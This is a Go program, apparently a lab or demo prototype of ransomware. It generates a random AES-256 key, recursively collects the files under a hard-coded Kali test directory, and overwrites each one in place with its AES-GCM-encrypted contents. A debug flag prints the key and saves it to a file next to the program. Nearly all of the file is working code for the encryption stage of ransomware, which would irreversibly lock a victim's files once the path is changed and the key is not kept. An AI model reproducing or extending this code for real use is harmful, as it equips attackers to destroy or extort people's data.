package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

const DEBUG bool = true

var file_paths []string

func main() {
	// Key Generation
	key, err := GenerateKey()

	if DEBUG {
		fmt.Println("Key: ", hex.EncodeToString(key))
	}

	if err != nil {
		panic(err)
	}

	// Path Discovery
	const root string = "/home/kali/Documents/GoDemo2/test"
	err2 := filepath.WalkDir(root, visitFile)
	if err2 != nil {
		fmt.Printf("Error walking the path: %v\n", err)
	}

	// Encryption Loop
	for _, path := range file_paths {
		fmt.Println("Path: ", path)

		// Get bytes of the file content
		var content []byte = readFile(path)
		encrypted_content, err := encrypt(content, key)
		if err != nil {
			panic(err)
		}
		if DEBUG {
			fmt.Println("Encrypted Content: ", string(encrypted_content))
		}
		writeEncryptedContent(encrypted_content, path)
	}

}

func GenerateKey() ([]byte, error) {
	key := make([]byte, 32)

	_, err := io.ReadFull(rand.Reader, key)

	if err != nil {
		return nil, err
	}

	if DEBUG {
		file, err := os.Create("../key.txt")
		if err != nil {
			panic(err)
		}
		defer file.Close()
		_, err = file.Write(key)
		if err != nil {
			panic(err)
		}

	}

	return key, nil

}

func visitFile(fp string, fi os.DirEntry, err error) error {
	if err != nil {
		fmt.Println(err) // can't walk here,
		return nil       // but continue walking elsewhere
	}

	if DEBUG {
		if !fi.IsDir() {
			file_paths = append(file_paths, fp)
		}
	}
	return nil
}

func readFile(file_path string) []byte {
	file, err := os.Open(file_path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	content, err := io.ReadAll(file)
	if err != nil {
		panic(err)
	}

	if DEBUG {
		fmt.Println("File Content: ", string(content))
	}

	return content
}

func encrypt(content []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		panic(err)
	}

	cypherText := gcm.Seal(nonce, nonce, content, nil)
	return cypherText, nil

}

func writeEncryptedContent(content []byte, file_path string) {
	file, err := os.OpenFile(file_path, os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = file.Write(content)
	if err != nil {
		panic(err)
	}
}
